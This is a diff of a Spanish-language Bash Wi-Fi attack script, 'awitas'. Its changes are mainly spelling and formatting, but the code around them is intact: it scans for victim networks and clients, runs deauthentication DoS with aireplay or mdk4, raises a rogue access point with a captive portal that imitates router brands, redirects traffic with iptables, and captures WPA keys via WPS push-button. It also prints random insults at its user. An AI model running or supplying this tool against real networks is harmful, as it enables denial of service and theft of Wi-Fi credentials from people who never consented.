@@ -1,21 +1,24 @@
 #!/bin/bash
 version=1.0
+# Establecer la codificación de carácter
+export LANG=en_US.UTF-8
+export LC_ALL=en_US.UTF-8
 ## Para soporte, lloros y quejas, empaquetar /tmp/awitas/ y compartirlo junto con el problema javierbu @ proton me
 ########################### byTux0
-### Este script esta inspirado en el trabajo de Koala633 con su trabajo hostbase. https://github.com/Koala633/hostbase ###
+### Este script está inspirado en el trabajo de Koala633 con su trabajo hostbase. https://github.com/Koala633/hostbase ###
 ###
-### La implementacion del portal cautivo esta inspirada o fusilada del trabajo de v1s1t0r1sh3r3 en airgeddon https://github.com/v1s1t0r1sh3r3/airgeddon
+### La implementación del portal cautivo está inspirada o fusilada del trabajo de v1s1t0r1sh3r3 en airgeddon https://github.com/v1s1t0r1sh3r3/airgeddon
 ###
-####### Quiza te interese configurar las siguientes variabes###############
+####### Quizá te interese configurar las siguientes variables ###############
 # Es el directorio donde se guardan las variables y las salidas de los comandos importantes. Muy interesante si se necesita depurar algo
 pwd=/tmp/awitas/
-# Es el tiempo (en segundos) de espera despues de quitar el modo monitor durante el ataque. Algunos dispositivos se toman su tiempo.
+# Es el tiempo (en segundos) de espera después de quitar el modo monitor durante el ataque. Algunos dispositivos se toman su tiempo.
 tiempo_espera_monitor=5
 # Este es el tiempo (en segundos) de espera al reiniciar NertworManager durante el ataque. Algunos dispositivos tardan en volver a trabajar bien.
 tiempo_espera=20
 # Estos son los paquetes de desautenticacion que manda aireplay. Ponlos a tu gusto, a fin de cuentas a mi me da lo mismo..
 desaut=60
-# Estos son los segundos que estaremos haciendo el DoS con mdk4 si escogemos esta opcion.
+# Estos son los segundos que estaremos haciendo el DoS con mdk4 si escogemos esta opción.
 tiempo_mdk4=40
 ############################################################################3
 ##################################
@@ -40,7 +43,8 @@ mkdir ${pwd} &>/dev/null
 echo $canal >${pwd}/canal
 canal_nuevo=2
 pwd_local=$(pwd)
-function salida () {
+
+function salida() {
 if [ "$salir" == "1" ];then
     exit 1
 fi
@@ -64,13 +68,14 @@ for proceso in lighttpd opennds dnsmasq hostapd wpa_supplicant ;do
         echo -e "${VERDE}[::]${BLANCO} Matando PID $i de $proceso."
         kill -9 $i 
     done
-        echo -e "${VERDE}[::]${BLANCO} Todo limpio. Hasta la proxima!."; echo
-        echo -e "${ROJO}[!!]${BLANCO} Te recomiendo que si vas a volver a intentar el ataque, reinicies el equipo antes. La limpieza no siempre funciona."
+        echo -e "${VERDE}[::]${BLANCO} Todo limpio. Hasta la próxima!."; echo
+        echo -e "${ROJO}[!!]${BLANCO} Te recomiendo que, si vas a volver a intentar el ataque, reinicies el equipo antes. La limpieza no siempre funciona."
         break
 done
 kill -9 $$ >/dev/null 1>&2 && exit 
 }
-function eleccion_dispositivo () {
+
+function eleccion_dispositivo() {
 echo;echo " Lista de dispositivos disponibles:";echo
 rm ${pwd}lista_interfaces 2>/dev/null
 iw dev | grep -oP 'Interface \K\S+' >${pwd}lista_interfaces 
@@ -114,7 +119,8 @@ unset driver phy 24 5 monitor AP
 done
 echo
 }
-function abierto () {
+
+function abierto() {
 /etc/init.d/wpa_supplicant stop &>/dev/null
 systemctl stop wpa_supplicant.service &>/dev/null
 killall wpa_supplicant &>/dev/null
@@ -200,7 +206,7 @@ do
         touch ${pwd}parar
         break
     else
-        echo -e "${CYAN}[AP]${BLANCO}	Nadie conectado todavia en nuestro punto de acceso. Seguimos..."
+        echo -e "${CYAN}[AP]${BLANCO}	Nadie conectado todavía en nuestro punto de acceso. Seguimos..."
     fi
     if [ $tipo -ne 2 ];then
         kill $pid_wps_pbc &>/dev/null
@@ -210,7 +216,8 @@ do
 done
 pbc_bucle
 }
-function server () {
+
+function server() {
 echo '
 server.modules = (
 "mod_auth",
@@ -255,12 +262,14 @@ echo "server.document-root = \"${pwd}server/\"" >> ${pwd}lighttpd.conf
 lighttpd -f ${pwd}lighttpd.conf &
 pid_lighttpd=$!
 }
-function fiptables () {
+
+function fiptables() {
 iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.168.12.1:80
 iptables -A INPUT -p tcp --destination-port 80 -j ACCEPT
 iptables -A INPUT -p tcp --destination-port 443 -j ACCEPT
 iptables -A INPUT -p udp --destination-port 53 -j ACCEPT
 }
+
 function generar_index() {
 rm -r ${pwd}server 2>/dev/null
 mkdir -p ${pwd}server/images 
@@ -550,8 +559,9 @@ elif [ "$modelo" == "Askey" ];then
     echo -e '</html>'" >${pwd}server/index.htm
 fi
 }
+
 function berate_confirmado() {
-echo -e "${AMARILLO}[AP]${BLANCO}	Levantando punto de acceso... Si no pasas de esta pantalla, revisa que tu dispositivo sopote el modo AP.${BLANCO}"
+echo -e "${AMARILLO}[AP]${BLANCO}	Levantando punto de acceso... Si no pasas de esta pantalla, revisa que tu dispositivo soporte el modo AP.${BLANCO}"
 while :
 do
     grep ENABLE ${pwd}hostapd &>/dev/null
@@ -564,23 +574,25 @@ do
     fi
 done
 }
-echo "Vaya dedos tienes. Pon mas atencion.
+
+echo "Vaya dedos tienes. Pon más atención.
 Estas un poco torpe, no?
 No sabes escribir?
-Madre mia del amor hermoso que torpeza la tuya.
-Tan dificil es?
+Madre mía del amor hermoso que torpeza la tuya.
+Tan difícil es?
 Que usas, salchichas en vez de dedos?
 Busco un tutorial en youtube de como teclear?
 En serio?
 Tienes cerca a alguien que pueda teclear por ti?
-Asi no terminamos nunca.
-Tu torpeza no tiene limites.
-Habria que pedirle a platzy que te haga un curso especial para que aprendas a escribir.
+Así no terminamos nunca.
+Tu torpeza no tiene límites.
+Habría que pedirle a platzy que te haga un curso especial para que aprendas a escribir.
 Tas pendejo?
 Bro, me estas vacilando, no?" >${pwd}torpe
-function validar_numero () {
+
+function validar_numero() {
 if [[ $1 -eq "0" ]] 2>/dev/null;then
-    echo -ne "${BLANCO}[!!]${CYAN} `shuf -n 1 ${pwd}torpe`${AZUL} $1${NORMAL} no es una respuesta valida. Pulsa enter para probar otra vez${NORMAL}"
+    echo -ne "${BLANCO}[!!]${CYAN} `shuf -n 1 ${pwd}torpe`${AZUL} $1${NORMAL} no es una respuesta valida. Pulsa ENTER para probar otra vez${NORMAL}"
     read
     $2
 fi
@@ -590,14 +602,15 @@ do
     if [[ $1 =~ $numero ]];then
         break
     else
-        echo -ne "${BLANCO}[!!]${CYAN} `shuf -n 1 ${pwd}torpe`${AZUL} $1${NORMAL} no es una repsuesta valida. Pulsa enter para probar otra vez${NORMAL}"
+        echo -ne "${BLANCO}[!!]${CYAN} `shuf -n 1 ${pwd}torpe`${AZUL} $1${NORMAL} no es una respuesta valida. Pulsa ENTER para probar otra vez${NORMAL}"
         read
         $2
         break
     fi
 done
 }
-function comprobar_wpa () {
+
+function comprobar_wpa() {
 while :
 do
     sleep 10
@@ -624,7 +637,8 @@ done
 kill $pids >/dev/null 2>&1
 salida
 }
-function archivo_pbc () {
+
+function archivo_pbc() {
 kill $pid_comprobar_wpa &>/dev/null
 kill $wpa_supplicant_pid &>/dev/null
 ls ${pwd}pbc.conf &>/dev/null
@@ -637,7 +651,8 @@ fi
 comprobar_wpa
 pid_comprobar_wpa=$!
 }
-function escuchar_wps () {
+
+function escuchar_wps() {
 ls ${pwd}pbc.conf &>/dev/null
 if [ $? -ne 0 ];then
     archivo_pbc
@@ -656,7 +671,8 @@ comprobar_wpa &
 crono
 crono_pid=$!
 }
-function crono () {
+
+function crono() {
 krono=30
 while [ $krono -gt 0 ]; 
 do
@@ -672,8 +688,9 @@ pid_wpacli=$!
 crono
 crono_pid=$!
 }
-function pbc_bucle () {
-echo -e "${VERDE}[WPS]${BLANCO}	Comenzamos  a escuchar WPS"
+
+function pbc_bucle() {
+echo -e "${VERDE}[WPS]${BLANCO}	Comenzamos a escuchar WPS"
 sleep 2 
 monitor quitar &>/dev/null
 escuchar_wps
@@ -681,7 +698,8 @@ sleep 3
 comprobar_wpa
 pid_comprobar_wpa=$!
 }
-function comprobar () {
+
+function comprobar() {
 clear
 banner
 if [ $tipo -eq 1 ];then
@@ -714,10 +732,10 @@ echo -e "   ${AMARILLO}2)${BLANCO}	Quiero volver a configurarlo todo. "
 echo -e "   ${AMARILLO}3)${BLANCO}	Quiero volver a configurar los datos del punto de acceso. "
 echo -e "   ${AMARILLO}4)${BLANCO}	Quiero volver a elegir red de las que ya hemos escaneado. "
 echo -e "   ${AMARILLO}5)${BLANCO}	Quiero volver a escanear. "
-echo;echo -ne "${AMARILLO}[??]${BLANCO}	Opcion: "
+echo;echo -ne "${AMARILLO}[??]${BLANCO}	Opción: "
 read opcion
 if [ -z $opcion ];then
-        echo -ne "${ROJO}[!!]${BLANCO} Se te ha olvidado escribir? Pulsa enter para comenzar de nuevo, y pon mas atencion: "
+        echo -ne "${ROJO}[!!]${BLANCO} Se te ha olvidado escribir? Pulsa ENTER para comenzar de nuevo, y pon más atención: "
         read
         comprobar 
 fi
@@ -733,16 +751,17 @@ elif [ $opcion -eq 4 ];then
 elif [ $opcion -eq 5 ];then
     airodump
 else
-    echo -ne "${BLANCO}[!!]${CYAN} `shuf -n 1 ${pwd}torpe`${AZUL} $opcion${NORMAL} no es una repsueta valida. Pulsa enter para probar otra vez${NORMAL}"
+    echo -ne "${BLANCO}[!!]${CYAN} `shuf -n 1 ${pwd}torpe`${AZUL} $opcion${NORMAL} no es una respuesta valida. Pulsa ENTER para probar otra vez${NORMAL}"
     read
     comprobar
 fi
 }
-function dos () {
+
+function dos() {
 clear
 banner
 rm ${pwd}parar &>/dev/null
-echo;echo -e "${AMARILLO}   COMIENZA EL ATAQUE! No se abriran ventanas adicionales. Para depurar, mirar en la carpeta ${pwd}${BLANCO}";echo
+echo;echo -e "${AMARILLO}   COMIENZA EL ATAQUE! No se abrirán ventanas adicionales. Para depurar, mirar en la carpeta ${pwd}${BLANCO}";echo
 echo -e "${VERDE}[AP]${BLANCO}	Punto de acceso ${AMARILLO}$nombre_ap${BLANCO} levantado! Seguimos...${BLANCO}"
 echo -e "${VERDE}[DoS]${BLANCO}	Inicia ataque DoS..."
 while :
@@ -771,6 +790,7 @@ do
 done
 echo -e "${AMARILLO}[DoS]${BLANCO}	Ataque DoS parado por completo."
 }
+
 function canal_nuevo {
 rm ${pwd}airodump_canal* 2>/dev/null
 if [ $banda5 = si ];then
@@ -799,30 +819,31 @@ fi
 canal=$canal_nuevo
 echo $canal ${pwd}canal &>/dev/null
 }
-function config_ap () {
+
+function config_ap() {
 clear
 banner
 echo;echo -e "${AMARILLO}[::]${BLANCO} Ahora toca configurar nuestro punto de acceso${BLANCO}."
 echo -e "${AMARILLO}[::]${BLANCO} Levantaremos un punto de acceso protegido (solo para clientes con windows) o abierto? ${BLANCO}";echo
 echo -e "  ${AMARILLO}1)${BLANCO}  Protegido"
 echo -e "  ${AMARILLO}2)${BLANCO}  Abierto"
-echo;echo -ne "${AMARILLO}[??]${BLANCO} Opcion: "
+echo;echo -ne "${AMARILLO}[??]${BLANCO} Opción: "
 read tipo
 if [ -z $tipo ];then
-        echo -ne "${ROJO}[!!]${BLANCO} Se te ha olvidado escribir? Pulsa enter para comenzar de nuevo, y pon mas atencion: "
+        echo -ne "${ROJO}[!!]${BLANCO} Se te ha olvidado escribir? Pulsa ENTER para comenzar de nuevo, y pon más atención: "
         read
         config_ap
 fi
 validar_numero $tipo config_ap
 if [ $tipo -ne 1 ] && [ $tipo -ne 2 ];then
-    echo -ne "${ROJO}[!!]${BLANCO} $tipo no es una respuesta valida. Pulsa enter para intentarlo otra vez"
+    echo -ne "${ROJO}[!!]${BLANCO} $tipo no es una respuesta valida. Pulsa ENTER para intentarlo otra vez"
     read
     config_ap
 fi
 echo;echo -ne "${AMARILLO}[::]${BLANCO} Nombre el punto de acceso que vamos a crear. (Necesario): "
 read nombre_ap
 if [ -z $nombre_ap ];then
-        echo -ne "${ROJO}[!!]${BLANCO} Se te ha olvidado escribir? Pulsa enter para comenzar de nuevo, y pon mas atencion: "
+        echo -ne "${ROJO}[!!]${BLANCO} Se te ha olvidado escribir? Pulsa ENTER para comenzar de nuevo, y pon más atención: "
         read
         config_ap 
 fi
@@ -836,7 +857,7 @@ echo;echo -e "${AMARILLO}[::]${BLANCO} Info recopilada de la victima:"
 echo;echo -e "${AZUL} Info OUI (marca): ${BLANCO}$marca"
 echo -e "${AZUL} BSSID:${BLANCO} $maoui"
 echo -e "${AZUL} ESSID:${BLANCO}$red"
-echo;echo -e "${AMARILLO}[::]${BLANCO} Elige la mejor opcion para la trampa. Si no sabes que es esto, elige generico: "
+echo;echo -e "${AMARILLO}[::]${BLANCO} Elige la mejor opción para la trampa. Si no sabes qué es esto, elige genérico: "
 echo
 rm ${pwd}modelos 2>/dev/null
 touch ${pwd}modelos
@@ -856,20 +877,21 @@ read puesto
 if [ -n "$puesto" ];then
     validar_numero $puesto config_ap
 else
-    echo -ne "${ROJO}[!!]${BLANCO} $puesto no es una opcion valida. Pulsa enter para intentarlo otra vez"        
+    echo -ne "${ROJO}[!!]${BLANCO} $puesto no es una opción valida. Pulsa ENTER para intentarlo otra vez"        
         read
         config_ap
 fi
 grep -q $puesto ${pwd}modelos
 if [ $? -ne 0 ];then
-echo -ne "${ROJO}[!!]${BLANCO} $puesto no es una opcion valida. Pulsa enter para intentarlo otra vez"        
+echo -ne "${ROJO}[!!]${BLANCO} $puesto no es una opción valida. Pulsa ENTER para intentarlo otra vez"        
         read
         config_ap
 fi
 modelo=`cat ${pwd}modelos | grep $puesto | awk '{print $2}'`
 comprobar
 }
-function clientes () {
+
+function clientes() {
 clear
 banner
 sed -n ${1}p ${pwd}airodump >${pwd}elegida
@@ -900,10 +922,10 @@ echo;echo -e "${AMARILLO}[::]${BLANCO} Elige una de las siguientes opciones:" ;e
 echo -e "		${AMARILLO}1)${BLANCO} Quiero elegir un cliente y continuar el ataque."
 echo -e "		${AMARILLO}2)${BLANCO} Quiero elegir otra red de las que hemos escaneado ya."
 echo -e "		${AMARILLO}3)${BLANCO} Quiero volver a escanear."
-echo;echo -ne "${AMARILLO}[::]${BLANCO} Opcion: "
+echo;echo -ne "${AMARILLO}[::]${BLANCO} Opción: "
 read respuesta
 if [ -z $respuesta ];then
-        echo -ne "${ROJO}[!!]${BLANCO} Se te ha olvidado escribir? Pulsa enter para intentarlo de nuevo, y pon mas atencion: "
+        echo -ne "${ROJO}[!!]${BLANCO} Se te ha olvidado escribir? Pulsa ENTER para intentarlo de nuevo, y pon mas atención: "
         read
         parseo
 fi
@@ -923,7 +945,7 @@ if [ $respuesta = 1 ];then
     echo;echo -ne "${AMARILLO}[::]${BLANCO} Opcion: "
     read opcion
     if [ -z $opcion ];then
-        echo -ne "${ROJO}[!!]${BLANCO} Se te ha olvidado escribir? Pulsa enter para comenzar de nuevo, y pon mas atencion: "
+        echo -ne "${ROJO}[!!]${BLANCO} Se te ha olvidado escribir? Pulsa ENTER para comenzar de nuevo, y pon más atención: "
         read
         parseo
     fi
@@ -933,7 +955,7 @@ if [ $respuesta = 1 ];then
         mac_estacion=`cat ${pwd}cliente${opcion}`
         elegir_dos
     else
-        echo -ne "${BLANCO}[!!]${CYAN} `shuf -n 1 ${pwd}torpe`${AZUL} $opcion${NORMAL} no es una repsuesta valida.  Pulsa enter para probar otra vez${NORMAL}"
+        echo -ne "${BLANCO}[!!]${CYAN} `shuf -n 1 ${pwd}torpe`${AZUL} $opcion${NORMAL} no es una respuesta valida. Pulsa ENTER para probar otra vez${NORMAL}"
         read
         parseo
     fi
@@ -942,12 +964,13 @@ elif [ $respuesta = 2 ];then
 elif [ $respuesta = 3 ];then
     airodump
 else
-    echo -ne "${BLANCO}[!!]${CYAN} `shuf -n 1 ${pwd}torpe`${AZUL} $respuesta${NORMAL} no es una opcion valida. Pulsa enter para probar otra vez${NORMAL}"
+    echo -ne "${BLANCO}[!!]${CYAN} `shuf -n 1 ${pwd}torpe`${AZUL} $respuesta${NORMAL} no es una opción valida. Pulsa ENTER para probar otra vez${NORMAL}"
     read
     parseo
     exit
 fi
 }
+
 function elegir_dos() {
 ls ${pwd}Openwrt
 if [ $? -ne 0  ];then
@@ -956,10 +979,10 @@ if [ $? -ne 0  ];then
     echo;echo -e "${AMARILLO}[::]${BLANCO} Como quieres hacer el DoS?"
     echo;echo -e "${AMARILLO}  1)${BLANCO}  Aireplay."
     echo -e "${AMARILLO}  2)${BLANCO}  Mdk4."
-    echo;echo -ne "${AMARILLO}[::]${BLANCO} Opcion: "
+    echo;echo -ne "${AMARILLO}[::]${BLANCO} Opción: "
     read opcion
     if [ -z $opcion ];then
-        echo -ne "${ROJO}[!!]${BLANCO} Se te ha olvidado escribir? Pulsa enter para comenzar de nuevo, y pon mas atencion: "
+        echo -ne "${ROJO}[!!]${BLANCO} Se te ha olvidado escribir? Pulsa ENTER para comenzar de nuevo, y pon más atención: "
         read
         elegir_dos
     fi
@@ -971,14 +994,15 @@ if [ $? -ne 0  ];then
         mdk4=si
         ataque_dos=Mdk4
     else
-        echo -ne "${BLANCO}[!!]${CYAN} `shuf -n 1 ${pwd}torpe`${AZUL} $opcion ${NORMAL}no es una respuesta valida. Pulsa enter para probar otra vez${NORMAL}"
+        echo -ne "${BLANCO}[!!]${CYAN} `shuf -n 1 ${pwd}torpe`${AZUL} $opcion ${NORMAL}no es una respuesta valida. Pulsa ENTER para probar otra vez${NORMAL}"
         read
         elegir_dos
     fi
 fi
 config_ap
 }
-function banner () {
+
+function banner() {
 echo -e "${CYAN}                 _            "
 echo -e "   __ ___      _(_) |_ __ _ ___ "
 echo -e "  / _\` \\ \\ /\\ / / | __/ _\` / __|"
@@ -1000,7 +1024,8 @@ if [ "$distro" != "si" ];then
 fi
 echo
 }
-function parseo () {
+
+function parseo() {
 clear
 banner
 cuenta=1
@@ -1022,7 +1047,7 @@ do
     echo " ${AMARILLO}${cuenta})	${CYAN}BSSID${BLANCO}	`echo $line |  cut -d ',' -f1`	${CYAN}Canal${BLANCO}	`echo $line |  cut -d ',' -f4`	${CYAN}clientes${BLANCO} $clients	${CYAN}Nombre Ap${BLANCO}	`echo $line | cut -d ',' -f14`"
     cuenta=$((cuenta+1))
 done < ${pwd}airodump
-echo;echo -ne "${AMARILLO}[??]${BLANCO} Elige una de ellas para estudiarla o no escribas nada para volver a escanear. Opcion: "
+echo;echo -ne "${AMARILLO}[??]${BLANCO} Elige una de ellas para estudiarla o no escribas nada para volver a escanear. Opción: "
 read red
 if [ -v $red ];then
     airodump
@@ -1032,19 +1057,20 @@ else
     if [ $red -le $cuenta ]; then
         clientes $red 
     else
-        echo -ne "${BLANCO}[!!]${CYAN} `shuf -n 1 ${pwd}torpe`${AZUL}. $red${NORMAL} no es una respuesta valida. Pulsa enter para probar otra vez${NORMAL}"
+        echo -ne "${BLANCO}[!!]${CYAN} `shuf -n 1 ${pwd}torpe`${AZUL}. $red${NORMAL} no es una respuesta valida. Pulsa ENTER para probar otra vez${NORMAL}"
         read
         parseo
     fi
 fi
 }
-function airodump () {
+
+function airodump() {
 clear
 banner
-echo;echo -e "${AMARILLO}[::]${BLANCO} Ahora lo que haremos sera escanear para buscar una victima."
+echo;echo -e "${AMARILLO}[::]${BLANCO} Ahora lo que haremos será escanear para buscar una víctima."
 echo -e "${AMARILLO}[::]${BLANCO} Vamos a buscar nuestra victima. Ten en cuenta que necesitamos al menos un cliente con windows para el punto de acceso protegido."
-echo -e "${AMARILLO}[::]${BLANCO} Cuando creas que ya es suficiente, cierra aierodump con ctrl+c y el script seguira su marcha."
-echo -ne "${AMARILLO}[::]${BLANCO} Pulsa enter para iniciar la busqueda"
+echo -e "${AMARILLO}[::]${BLANCO} Cuando creas que ya es suficiente, cierra aierodump con ctrl+c y el script seguirá su marcha."
+echo -ne "${AMARILLO}[::]${BLANCO} Pulsa ENTER para iniciar la búsqueda"
 read
 rm ${pwd}airodump* 2>/dev/null
 airodump=1
@@ -1056,7 +1082,8 @@ fi
 airodump=0
 parseo
 }
-function scan () {
+
+function scan() {
 echo -e "${AMARILLO}[::]${BLANCO} Poniendo $iface_dos en modo monitor..."
 monitor poner
 if [ $? = 0 ];then
@@ -1067,7 +1094,8 @@ else
 fi
 airodump
 }
-function monitor () {
+
+function monitor() {
 if [ $1 = quitar ];then
     ip link set dev $iface_dos down
     ip link set dev $iface_dos name $iface_dos
@@ -1084,7 +1112,7 @@ elif [ $1  = poner ];then
         echo $iface_mon >${pwd}iface_mon
         echo $canal >${pwd}canal_mon &>/dev/null
     else
-        echo " Se ha fallado al poner tu dispositivo en modo monitor. Revisa que tu dispositivo soporte esta opcion."
+        echo " Se ha fallado al poner tu dispositivo en modo monitor. Revisa que tu dispositivo soporte esta opción."
         exit 1
     fi
 elif [ $1 = limpiar ];then
@@ -1094,20 +1122,21 @@ elif [ $1 = limpiar ];then
     ip link set dev $iface_dos up
 fi
 }
-function empezar () {
+
+function empezar() {
 clear
 banner
-echo;echo -e "${CYAN} En la cabecera del sript puedes configurar algunas cosas. Quiza te venga bien."
-echo;echo -e "${AMARILLO}[::]${BLANCO} Bienvenido a awitas. Un poco de paciencia, se esta cociendo..."
+echo;echo -e "${CYAN} En la cabecera del script puedes configurar algunas cosas. Quizá te venga bien."
+echo;echo -e "${AMARILLO}[::]${BLANCO} Bienvenido a awitas. Un poco de paciencia, se está cociendo..."
 if [ ! -e oui.txt ] && [ "$openwrt" != "1" ];then
-    echo -e "${ROJO}[!!]${BLANCO} No tienes el archivo oui.txt. Este archivo servira para aportar informacion sobre los dispositivos que tratemos de atacar. No es necesario, pero es aconsejable.";echo
-    echo -e "${AMARILLO}[::]${BLANCO} Escribe \"si\" para descargarlo o enter para no hacerlo. Si lo descargas ya no volveras a ver este mensaje. Escribe "cansino" si no quieres vover a ver este mensaje, pero tampoco descargar el archivo.  "
+    echo -e "${ROJO}[!!]${BLANCO} No tienes el archivo oui.txt. Este archivo servirá para aportar información sobre los dispositivos que tratemos de atacar. No es necesario, pero es aconsejable.";echo
+    echo -e "${AMARILLO}[::]${BLANCO} Escribe \"si\" para descargarlo o ENTER para no hacerlo. Si lo descargas ya no volverás a ver este mensaje. Escribe "cansino" si no quieres volver a ver este mensaje, pero tampoco descargar el archivo."
     echo;echo -ne "${AMARILLO}[??]${BLANCO} Respuesta: "
     read respuesta
     if [ "$respuesta" = si ];then
         echo -e "${VERDE}[>>]${BLANCO} Descargando..."
         wget  https://standards-oui.ieee.org/oui/oui.txt &>/dev/null
-        echo -e "${VERDE}[::]${BLANCO} Descargado!. Enter para continuar. "
+        echo -e "${VERDE}[::]${BLANCO} Descargado!. ENTER para continuar. "
         read; empezar
     elif [ "$respuesta" == "cansino" ];then
         touch oui.txt
@@ -1127,10 +1156,10 @@ echo -e "${AMARILLO}[::]${BLANCO} Para hacer el ataque en la banda de 5 GHz, nec
 echo -e "${AMARILLO}[::]${BLANCO} Elige la banda en la que haremos el ataque:";echo
 echo -e "${AMARILLO}  1)${BLANCO}   Banda de 5 GHz."
 echo -e "${AMARILLO}  2)${BLANCO}   Banda de 2,4 GHz."
-echo;echo -ne "${AMARILLO}[??]${BLANCO} Opcion: "
+echo;echo -ne "${AMARILLO}[??]${BLANCO} Opción: "
 read banda
 if [ -z $banda ];then
-    echo -ne "${ROJO}[!!]${BLANCO} Tienes que escribir uno de los numeros que se te proponen. Tan dificil es? pulsa enter para repetir. "
+    echo -ne "${ROJO}[!!]${BLANCO} Tienes que escribir uno de los números que se te proponen. Tan difícil es? pulsa ENTER para repetir."
     read
     empezar
 fi
@@ -1142,20 +1171,20 @@ elif [ $banda -eq "2" ];then
     banda5=no
     canal=6
 else
-    echo -ne "${BLANCO}[!!]${CYAN} `shuf -n 1 ${pwd}torpe`${AZUL} $banda${NORMAL} no es una respuesta valida. Pulsa enter para probar otra vez${NORMAL}"
+    echo -ne "${BLANCO}[!!]${CYAN} `shuf -n 1 ${pwd}torpe`${AZUL} $banda${NORMAL} no es una respuesta valida. Pulsa ENTER para probar otra vez${NORMAL}"
     read
     empezar
 fi
 clear
 banner
 if [ $banda5 = si ];then
-    echo;echo -e "${VIOLETA}[::]${BLANCO} El ataque se hara sobre la banda de 5 GHz"
+    echo;echo -e "${VIOLETA}[::]${BLANCO} El ataque se hará sobre la banda de 5 GHz"
 else
-    echo;echo -e "${VIOLETA}[::]${BLANCO} El ataque se hara sobre la banda de 2,4 GHz"
+    echo;echo -e "${VIOLETA}[::]${BLANCO} El ataque se hará sobre la banda de 2,4 GHz"
 fi
 echo;echo -e "${AMARILLO}[::]${BLANCO} Ahora lo que vamos a hacer es elegir un dispositivo para crear nuestro punto de acceso."
-echo -e "${AMARILLO}[::]${BLANCO} El punto de acceso siempre se hara sobre la banda de 2,4 GHz, por lo que no es necesario que el dispositivo trabaje en 5 GHz"
-echo -e "${AMARILLO}[::]${BLANCO} Por favor, ten en cuenta que el dispositivo tiene que soportar la opcion de crear puto de acceso."
+echo -e "${AMARILLO}[::]${BLANCO} El punto de acceso siempre se hará sobre la banda de 2,4 GHz, por lo que no es necesario que el dispositivo trabaje en 5 GHz"
+echo -e "${AMARILLO}[::]${BLANCO} Por favor, ten en cuenta que el dispositivo tiene que soportar la opción de crear puto de acceso."
 eleccion_dispositivo
 echo;echo -e "${AMARILLO}[::]${BLANCO} Elige un dispositivo para crear nuestro punto de acceso.";echo
 cuenta=1
@@ -1166,18 +1195,18 @@ do
 done
 cuenta=$((cuenta-1))
 if [ $cuenta -eq 0 ];then
-    echo -ne "${ROJO}[!!]${BLANCO} Es en serio? necesitas 2 dispositivos wireless para hacer el ataque y no tienes conectado ninguno. Pero tu sabes loque estas haciendo?. Anda, intoduce 2 dispositivos y pulsa enter para repetir. "
+    echo -ne "${ROJO}[!!]${BLANCO} Es en serio? necesitas 2 dispositivos wireless para hacer el ataque y no tienes conectado ninguno. Pero tú sabes loque estás haciendo? Anda, introduce 2 dispositivos y pulsa ENTER para repetir."
     read
     empezar
 elif [ "$cuenta" == "1" ];then
-    echo -ne "${ROJO}[!!]${BLANCO} Solo se ha detectado 1 adaptador wireless. Asi no podemos hacer el ataque. Introduce otro mas y pulsa enter para repetir. "
+    echo -ne "${ROJO}[!!]${BLANCO} Solo se ha detectado 1 adaptador wireless. Así no podemos hacer el ataque. Introduce otro más y pulsa ENTER para repetir."
     read
     empezar
 fi
-echo;echo -ne "${AMARILLO}[??]${BLANCO} Debes estar seguro que soporta el modo AP. Opcion: "
+echo;echo -ne "${AMARILLO}[??]${BLANCO} Debes estar seguro de que soporta el modo AP. Opción: "
 read opcion
 if [ -z $opcion ];then
-    echo -ne "${ROJO}[!!]${BLANCO} Se te ha olvidado escribir? Pulsa enter para comenzar de nuevo, y pon mas atencion: "
+    echo -ne "${ROJO}[!!]${BLANCO} Se te ha olvidado escribir? Pulsa ENTER para comenzar de nuevo, y pon más atención: "
     read
     empezar
 fi
@@ -1186,23 +1215,24 @@ if [ $opcion -le $cuenta ]; then
     cuenta=$((cuenta+1))
     sed -n ${opcion}p ${pwd}lista_interfaces | cut -f 1 >${pwd}iface_ap
     iface_ap=`cat ${pwd}iface_ap`
-    echo -e "${AMARILLO}[::]${BLANCO} Ok!. Usaremos ${VERDE}$iface_ap ${BLANCO}para crear nuestro punto de acceso. Pulsa enter para continuar."
+    echo -e "${AMARILLO}[::]${BLANCO} Ok!. Usaremos ${VERDE}$iface_ap ${BLANCO}para crear nuestro punto de acceso. Pulsa ENTER para continuar."
     read
 else
-    echo -ne "${BLANCO}[!!]${CYAN} `shuf -n 1 ${pwd}torpe`${AZUL} $opcion${NORMAL} no es una repsuesta valida. Pulsa enter para probar otra vez${NORMAL}"
+    echo -ne "${BLANCO}[!!]${CYAN} `shuf -n 1 ${pwd}torpe`${AZUL} $opcion${NORMAL} no es una respuesta valida. Pulsa ENTER para probar otra vez${NORMAL}"
     read
     empezar
 fi
 elegir_monitor
 }
-function elegir_monitor () {
+
+function elegir_monitor() {
 clear
 banner
-echo;echo -e "${AMARILLO}[::]${BLANCO} Ahora lo que haremos sera elegir un dispositivo para el ataque DoS."
+echo;echo -e "${AMARILLO}[::]${BLANCO} Ahora lo que haremos será elegir un dispositivo para el ataque DoS."
 echo -e "${AMARILLO}[::]${BLANCO} Debes estar seguro de que el dispositivo tiene la capacidad de inyectar paquetes."
-echo -e "${AMARILLO}[::]${BLANCO} Recuerda que si estamos haciendo el ataque en la banda de 5 GHz, necesitamos que este dispotivo trabaje en la banda de 5GHz"
+echo -e "${AMARILLO}[::]${BLANCO} Recuerda que, si estamos haciendo el ataque en la banda de 5 GHz, necesitamos que este dispositivo trabaje en la banda de 5GHz"
 echo;echo "${ROJO} ATENCION!!${NORMAL} Que un dispositivo acepte el modo monitor no significa necesariamente que pueda hacer"
-echo " un ataque de desautenticacion. Tendras que hacer tus propias pruebas para estar seguro.";echo
+echo " un ataque de desautenticacion. Tendrás que hacer tus propias pruebas para estar seguro.";echo
 eleccion_dispositivo
 echo -e  "${AMARILLO}[::]${BLANCO} Estos son los dispositivos que quedan disponibles:"
 echo;echo -e "${AMARILLO}[::]${BLANCO} Elige un dispositivo para hacer el ataque de desautenticacion (DoS)";echo
@@ -1212,10 +1242,10 @@ do
     echo -e " ${AMARILLO}${cuenta})${BLANCO}  $i "
     cuenta=$((cuenta+1))
 done
-echo;echo -ne "${AMARILLO}[::]${BLANCO} Debes estar seguro de que puede inyectar paquetes. Opcion: "
+echo;echo -ne "${AMARILLO}[::]${BLANCO} Debes estar seguro de que puede inyectar paquetes. Opción: "
 read opcion
 if [ -z $opcion ];then
-    echo -ne "${ROJO}[!!]${BLANCO} Se te ha olvidado escribir? Pulsa enter para comenzar de nuevo, y pon mas atencion: "
+    echo -ne "${ROJO}[!!]${BLANCO} Se te ha olvidado escribir? Pulsa ENTER para comenzar de nuevo, y pon más atención: "
     read
     elegir_monitor
